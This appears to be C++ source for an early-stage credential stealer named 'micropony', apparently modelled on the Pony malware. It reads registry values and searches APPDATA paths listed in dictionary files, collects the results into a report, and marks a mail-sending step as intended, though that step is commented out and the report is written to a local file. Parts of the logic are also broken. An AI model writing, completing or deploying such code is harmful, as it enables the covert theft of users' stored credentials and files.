#include "stdafx.h"
#include "micropony.h"

HKEY detectHKEY(std::string sectionName)
{
	if (sectionName == "HKEY_CLASSES_ROOT")
		return HKEY_CLASSES_ROOT;
	else if (sectionName == "HKEY_CURRENT_USER")
		return HKEY_CURRENT_USER;
	else if (sectionName == "HKEY_LOCAL_MACHINE")
		return HKEY_LOCAL_MACHINE;
	else if (sectionName == "HKEY_USERS")
		return HKEY_USERS;
	else if (sectionName == "HKEY_PERFORMANCE_DATA")
		return HKEY_PERFORMANCE_DATA;
	else if (sectionName == "HKEY_PERFORMANCE_TEXT")
		return HKEY_PERFORMANCE_TEXT;
	else if (sectionName == "HKEY_PERFORMANCE_NLSTEXT")
		return HKEY_PERFORMANCE_NLSTEXT;
	else if (sectionName == "HKEY_CURRENT_CONFIG")
		return HKEY_CURRENT_CONFIG;
	else if (sectionName == "HKEY_DYN_DATA")
		return HKEY_DYN_DATA;
	else if (sectionName == "HKEY_CURRENT_USER_LOCAL_SETTINGS")
		return HKEY_CURRENT_USER_LOCAL_SETTINGS;
	else
		return HKEY_CURRENT_USER;
}

int main()
{
	Report* report = new Report;
	List* list = new List;

	CSimpleIniA* ini = new CSimpleIniA;
	ini->SetUnicode();
	ini->LoadFile("reg.dic");
	ini->GetAllSections(list->sections);

	for (auto& pSection : list->sections)
	{
		std::cout << pSection.pItem << ":\n";
		ini->GetAllKeys(pSection.pItem, list->keys); // TODO: ignores the same path

		for (auto pPath : list->keys)
		{
			ini->GetAllValues(pSection.pItem, pPath.pItem, list->values);

			for (auto& pParam : list->values)
			{
				std::string value = getKeyValue(detectHKEY(pSection.pItem), pPath.pItem, pParam.pItem);
				std::cout << value << '\n';

				report->paths.push_back(pPath.pItem);
				report->params.push_back(pParam.pItem);
				report->values.push_back(value);

			}
		}
	}

	delete ini;

	std::cout << '\n';

	CSimpleIniA* dic = new CSimpleIniA;
	dic->LoadFile("file.dic");
	dic->GetAllSections(list->sections);

	for (auto& pSection : list->sections)
	{
		for (auto pPath : list->keys)
		{
			dic->GetAllValues(pSection.pItem, pPath.pItem, list->values);

			//for (auto& pParam : list->values)
			//{
				std::vector<WIN32_FIND_DATA> vecFiles;

				if (std::string(pSection.pItem) == "APPDATA")
				{
					std::stringstream ss;
					ss << getPath(CSIDL_APPDATA) << pPath.pItem;
					vecFiles = grabFile(ss.str().c_str());//, pParam.pItem);
					std::cout << ss.str();
				}
				else
					vecFiles = grabFile(pPath.pItem);//, pParam.pItem);

				std::cout << "Files:\n";

				for (auto& file : vecFiles)
				{
					std::cout << file.cFileName << '\n';

					report->paths.push_back(pPath.pItem);
					//report->params.push_back(pParam.pItem);
					report->values.push_back(file.cFileName);
				}
			//}
		}
	}

	delete dic;

	// Send report curl in mail

	static const char* email = "";
	static const char* emailEmergency = "";

	std::string message("");

	for (auto str : report->paths)
		message += str + ',';

	message += '\n';

	for (auto str : report->params)
		message += str + ',';

	message += '\n';

	for (auto str : report->values)
		message += str + ',';

	//sendMail(message);

	// test write to file
	std::ofstream out;
	out.open("out.txt");
	if (out.is_open())
	{
		out << message << '\n';
	}

    return 0;
}

